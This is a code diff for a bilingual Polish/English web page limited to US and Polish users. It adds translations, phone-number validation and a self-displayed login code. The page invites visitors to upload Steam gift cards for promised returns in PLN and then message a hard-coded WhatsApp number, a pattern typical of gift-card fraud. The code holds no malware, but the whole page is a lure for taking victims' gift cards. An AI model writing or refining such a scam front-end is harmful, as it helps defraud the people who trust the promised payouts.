@@ -43,10 +43,10 @@
 <div class="wrap">
   <!-- Signup/Login -->
   <div id="gate" class="card">
-    <h1>Welcome — Signup / Login (US & Poland only)</h1>
+    <h1 id="gateTitle">Welcome — Signup / Login (US & Poland only)</h1>
     <div class="grid cols-2" style="margin-top:10px">
       <div>
-        <label for="country">Country</label>
+        <label for="country" id="countryLabel">Country</label>
         <select id="country">
           <option value="">Choose…</option>
           <option value="PL">Poland</option>
@@ -54,7 +54,7 @@
         </select>
       </div>
       <div>
-        <label for="lang">Language</label>
+        <label for="lang" id="langLabel">Language</label>
         <select id="lang">
           <option value="pl">Polski</option>
           <option value="en" selected>English</option>
@@ -63,11 +63,11 @@
     </div>
     <div style="margin-top:12px" class="grid">
       <div>
-        <label for="name">Name</label>
+        <label for="name" id="nameLabel">Name</label>
         <input id="name" placeholder="Your name">
       </div>
       <div>
-        <label for="phone">Phone</label>
+        <label for="phone" id="phoneLabel">Phone</label>
         <input id="phone" placeholder="+48 ... or +1 ...">
       </div>
     </div>
@@ -80,7 +80,7 @@
 
     <div id="verifyRow" class="grid hidden" style="margin-top:12px">
       <div>
-        <label for="code">Enter code</label>
+        <label for="code" id="enterCodeLabel">Enter code</label>
         <input id="code" placeholder="Enter code">
       </div>
       <div class="center">
@@ -93,34 +93,34 @@
   <div id="home" class="card hidden">
     <div style="display:flex;justify-content:space-between;align-items:center">
       <div>
-        <h1>Upload a card</h1>
-        <div class="small-muted">United States & Poland only — Steam gift card uploads only.</div>
+        <h1 id="homeTitle">Upload a card</h1>
+        <div class="small-muted" id="uploadDesc">United States & Poland only — Steam gift card uploads only.</div>
       </div>
       <div class="center">
-        <div class="small-muted">Balance</div>
+        <div class="small-muted" id="homeBalanceLabel">Balance</div>
         <div id="balanceDisplay" style="font-size:18px;font-weight:700">0.00 PLN</div>
       </div>
     </div>
     <input id="fileInput" type="file" accept="image/*" style="display:none">
     <div id="previewWrap" style="margin-top:10px"></div>
     <div style="margin-top:12px">
-      <div class="small-muted">Choose method you want to earn:</div>
+      <div class="small-muted" id="chooseMethodLabel">Choose method you want to earn:</div>
       <div class="options" id="optionsList"></div>
     </div>
   </div>
 
   <!-- Account -->
   <div id="meCard" class="card hidden">
-    <h1>My Account</h1>
+    <h1 id="meTitle">My Account</h1>
     <div style="display:flex;justify-content:space-between;align-items:center">
       <div>
-        <div class="small-muted">Name</div>
+        <div class="small-muted" id="meNameLabel">Name</div>
         <div id="meName" style="font-weight:700">-</div>
-        <div class="small-muted" style="margin-top:8px">Phone</div>
+        <div class="small-muted" id="mePhoneLabel" style="margin-top:8px">Phone</div>
         <div id="mePhone">-</div>
       </div>
       <div>
-        <div class="small-muted">Balance</div>
+        <div class="small-muted" id="meBalanceLabel">Balance</div>
         <div id="meBalance" style="font-weight:700;font-size:18px">0.00 PLN</div>
       </div>
     </div>
@@ -145,8 +145,52 @@ const options = [
 ];
 
 const translations = {
-  en: { welcome:"Welcome — Signup / Login (US & Poland only)", country:"Country", language:"Language", name:"Name", phone:"Phone", sendCode:"Send code", notSent:"Not sent", enterCode:"Enter code", finishLogin:"Finish login", uploadCard:"Upload a card", uploadDesc:"United States & Poland only — Steam gift card uploads only.", chooseMethod:"Choose method you want to earn:", balance:"Balance", myAccount:"My Account", backHome:"⬅ Back to Home", alertCountry:"Only Poland and United States allowed", alertMissing:"Enter name + phone", loginSuccess:"Login success", loggedOut:"Logged out", waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN → ${profit} PLN.` },
-  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)", country:"Kraj", language:"Język", name:"Imię", phone:"Telefon", sendCode:"Wyślij kod", notSent:"Nie wysłano", enterCode:"Wpisz kod", finishLogin:"Zakończ logowanie", uploadCard:"Prześlij kartę", uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.", chooseMethod:"Wybierz metodę zarabiania:", balance:"Saldo", myAccount:"Moje konto", backHome:"⬅ Powrót do strony głównej", alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone", alertMissing:"Wpisz imię i telefon", loginSuccess:"Logowanie zakończone sukcesem", loggedOut:"Wylogowano", waMessage:(name,stake,profit)=>`Cześć, mam na imię ${name}. Chcę wybrać opcję ${stake} PLN → ${profit} PLN.` }
+  en: {
+    welcome:"Welcome — Signup / Login (US & Poland only)",
+    country:"Country", language:"Language",
+    name:"Name", phone:"Phone",
+    sendCode:"Send code", notSent:"Not sent",
+    enterCode:"Enter code", finishLogin:"Finish login",
+    uploadCard:"Upload a card",
+    uploadDesc:"United States & Poland only — Steam gift card uploads only.",
+    chooseMethod:"Choose method you want to earn:",
+    balance:"Balance",
+    myAccount:"My Account",
+    backHome:"⬅ Back to Home",
+    alertCountry:"Only Poland and United States allowed",
+    alertMissing:"Enter name + phone",
+    invalidPhone:"Invalid phone number for selected country!",
+    invalidCode:"Invalid code",
+    yourCode:"Your code: ",
+    loginSuccess:"Login success",
+    loggedOut:"Logged out",
+    optionDesc:"Upload Steam gift card to receive",
+    whatsappBtn:"💬 WhatsApp Me",
+    waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN → ${profit} PLN.`
+  },
+  pl: {
+    welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
+    country:"Kraj", language:"Język",
+    name:"Imię", phone:"Telefon",
+    sendCode:"Wyślij kod", notSent:"Nie wysłano",
+    enterCode:"Wpisz kod", finishLogin:"Zakończ logowanie",
+    uploadCard:"Prześlij kartę",
+    uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.",
+    chooseMethod:"Wybierz metodę zarabiania:",
+    balance:"Saldo",
+    myAccount:"Moje konto",
+    backHome:"⬅ Powrót do strony głównej",
+    alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone",
+    alertMissing:"Wpisz imię i telefon",
+    invalidPhone:"Nieprawidłowy numer telefonu dla wybranego kraju!",
+    invalidCode:"Nieprawidłowy kod",
+    yourCode:"Twój kod: ",
+    loginSuccess:"Logowanie zakończone sukcesem",
+    loggedOut:"Wylogowano",
+    optionDesc:"Prześlij kartę Steam, aby otrzymać",
+    whatsappBtn:"💬 Napisz na WhatsApp",
+    waMessage:(name,stake,profit)=>`Cześć, mam na imię ${name}. Chcę wybrać opcję ${stake} PLN → ${profit} PLN.`
+  }
 };
 
 const stateKey = "demo_safe_users";
@@ -156,7 +200,7 @@ const countryKey = "demo_safe_country";
 
 let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
 let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
-const whatsappNumber = "2348108462471";
+const whatsappNumber = "2348108462471"; // ✅ your WhatsApp number
 
 function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
 function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
@@ -165,50 +209,65 @@ function clearSession(){ localStorage.removeItem(sessionKey); }
 const el = id => document.getElementById(id);
 const show = id => el(id).classList.remove("hidden");
 const hide = id => el(id).classList.add("hidden");
-const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
+const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); };
 
 function updateLanguage(lang){
   localStorage.setItem(langKey, lang);
-  el("gate").querySelector("h1").textContent = translations[lang].welcome;
-  document.querySelector("label[for='country']").textContent = translations[lang].country;
-  document.querySelector("label[for='lang']").textContent = translations[lang].language;
-  document.querySelector("label[for='name']").textContent = translations[lang].name;
-  document.querySelector("label[for='phone']").textContent = translations[lang].phone;
+  // Gate
+  el("gateTitle").textContent = translations[lang].welcome;
+  el("countryLabel").textContent = translations[lang].country;
+  el("langLabel").textContent = translations[lang].language;
+  el("nameLabel").textContent = translations[lang].name;
+  el("phoneLabel").textContent = translations[lang].phone;
   el("sendCode").textContent = translations[lang].sendCode;
   el("codeSent").textContent = translations[lang].notSent;
-  document.querySelector("#verifyRow label").textContent = translations[lang].enterCode;
+  el("enterCodeLabel").textContent = translations[lang].enterCode;
   el("finishSignup").textContent = translations[lang].finishLogin;
-  el("home").querySelector("h1").textContent = translations[lang].uploadCard;
-  el("home").querySelector(".small-muted").textContent = translations[lang].uploadDesc;
-  document.querySelector("#home .small-muted").nextElementSibling.previousElementSibling.textContent = translations[lang].balance;
-  el("meCard").querySelector("h1").textContent = translations[lang].myAccount;
+
+  // Home
+  el("homeTitle").textContent = translations[lang].uploadCard;
+  el("uploadDesc").textContent = translations[lang].uploadDesc;
+  el("homeBalanceLabel").textContent = translations[lang].balance;
+  el("chooseMethodLabel").textContent = translations[lang].chooseMethod;
+
+  // Me
+  el("meTitle").textContent = translations[lang].myAccount;
+  el("meBalanceLabel").textContent = translations[lang].balance;
+  el("meNameLabel").textContent = translations[lang].name;
+  el("mePhoneLabel").textContent = translations[lang].phone;
   el("backHomeBtn").textContent = translations[lang].backHome;
+
+  // Re-render options with correct language
+  renderOptions();
 }
 
 function updateUI(){
   if(currentUser){
     hide('gate'); show('home'); hide('meCard'); show('topBar');
-    el('balanceDisplay').textContent = currentUser.balance.toFixed(2) + " PLN";
-    el('meName').textContent = currentUser.name;
-    el('mePhone').textContent = currentUser.phone;
-    el('meBalance').textContent = currentUser.balance.toFixed(2) + " PLN";
+    el('balanceDisplay').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
+    el('meName').textContent = currentUser.name || "-";
+    el('mePhone').textContent = currentUser.phone || "-";
+    el('meBalance').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
   } else {
     show('gate'); hide('home'); hide('meCard'); hide('topBar');
   }
 }
 
 function renderOptions(){
+  const lang = localStorage.getItem(langKey) || 'en';
   const list = el('optionsList'); list.innerHTML = '';
   options.forEach(opt=>{
     const div = document.createElement('div'); div.className='option';
-    div.innerHTML = `<h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
-      <div class="small-muted">Upload Steam gift card to receive ${opt.profit} PLN</div>
-      <button class="btn" data-id="${opt.id}">💬 WhatsApp Me</button>`;
+    div.innerHTML = `
+      <h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
+      <div class="small-muted">${translations[lang].optionDesc} ${opt.profit} PLN</div>
+      <button class="btn" data-id="${opt.id}">${translations[lang].whatsappBtn}</button>
+    `;
     list.appendChild(div);
   });
 }
-renderOptions();
 
+// WhatsApp button handler
 document.addEventListener('click', (e)=>{
   if(e.target.matches('[data-id]')){
     const lang = localStorage.getItem(langKey) || 'en';
@@ -224,36 +283,66 @@ document.addEventListener('click', (e)=>{
   }
 });
 
+// Country change → set language + phone prefix
 el("country").addEventListener("change", () => {
   const country = el("country").value;
   localStorage.setItem(countryKey, country);
-  if(country === "PL"){ el("lang").value = "pl"; updateLanguage("pl"); }
-  else if(country === "US"){ el("lang").value = "en"; updateLanguage("en"); }
+  if(country === "PL"){
+    el("lang").value = "pl"; updateLanguage("pl");
+    if(!el("phone").value.startsWith("+48")) el("phone").value = "+48";
+  } else if(country === "US"){
+    el("lang").value = "en"; updateLanguage("en");
+    if(!el("phone").value.startsWith("+1")) el("phone").value = "+1";
+  }
+});
+
+// Keep prefix present if user deletes it
+el("phone").addEventListener("input", () => {
+  const country = el("country").value;
+  let v = el("phone").value;
+  if(country === "PL" && !v.startsWith("+48")) el("phone").value = "+48" + v.replace(/^\+?48?/, "");
+  if(country === "US" && !v.startsWith("+1")) el("phone").value = "+1" + v.replace(/^\+?1?/, "");
 });
 
 el("lang").addEventListener("change", () => {
   updateLanguage(el("lang").value);
 });
 
+// Send code with strict PL/US phone validation
 el('sendCode').addEventListener('click', ()=>{
   const country = el('country').value;
   const lang = el('lang').value;
   const name = el('name').value.trim();
-  const phone = el('phone').value.trim();
+  let phone = el('phone').value.trim();
+
   if(country !== 'PL' && country !== 'US'){ alert(translations[lang].alertCountry); return; }
   if(!name || !phone){ alert(translations[lang].alertMissing); return; }
+
+  // Normalize and validate
+  let isValid = false;
+  if(country === "PL"){
+    phone = "+48" + phone.replace(/^\+?48?/, "");
+    isValid = /^\+48\d{9}$/.test(phone); // +48 + 9 digits
+  } else if(country === "US"){
+    phone = "+1" + phone.replace(/^\+?1?/, "");
+    isValid = /^\+1\d{10}$/.test(phone); // +1 + 10 digits
+  }
+  if(!isValid){ alert(translations[lang].invalidPhone); return; }
+
+  el("phone").value = phone; // keep corrected
   currentUser = users[phone] || { name, phone, balance:0 };
   currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
   users[phone] = currentUser; saveUsers();
+
   el('codeSent').textContent = '✅ ' + translations[lang].sendCode;
   show('verifyRow'); el('codeBox').classList.remove('hidden');
-  el('codeBox').textContent = "Your code: " + currentUser.pendingCode;
+  el('codeBox').textContent = translations[lang].yourCode + currentUser.pendingCode;
 });
 
 el('finishSignup').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const code = el('code').value.trim();
-  if(!currentUser || code !== currentUser.pendingCode){ alert('Invalid code'); return; }
+  if(!currentUser || code !== currentUser.pendingCode){ alert(translations[lang].invalidCode); return; }
   delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers(); saveSession();
   notif(translations[lang].loginSuccess); updateUI();
 });
@@ -265,14 +354,21 @@ el('logoutBtn').addEventListener('click', ()=>{
   currentUser=null; clearSession(); updateUI(); notif(translations[lang].loggedOut);
 });
 
-// ✅ Restore language & country on page load
+// Restore language, country, session on load
 window.addEventListener("DOMContentLoaded", () => {
   const savedLang = localStorage.getItem(langKey) || "en";
   const savedCountry = localStorage.getItem(countryKey) || "";
   el("lang").value = savedLang;
   el("country").value = savedCountry;
+
   updateLanguage(savedLang);
   updateUI();
+
+  // If phone empty, add prefix based on saved country
+  if(!el("phone").value){
+    if(savedCountry === "PL") el("phone").value = "+48";
+    if(savedCountry === "US") el("phone").value = "+1";
+  }
 });
 </script>
 </body>
